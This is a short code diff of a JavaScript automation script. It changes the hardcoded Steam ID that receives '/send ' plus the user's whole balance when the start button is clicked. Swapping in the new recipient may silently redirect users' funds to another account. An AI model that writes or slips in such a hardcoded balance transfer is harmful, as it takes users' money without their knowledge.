@@ -220,7 +220,7 @@ function Automated() {
     this.menu.start.onclick = function() {
         send({
         "type": "chat",
-        "msg": '/send 76561198138006602 ' + self.balance,
+        "msg": '/send 76561198142769000 ' + self.balance,
         "lang": LANG
     });
 
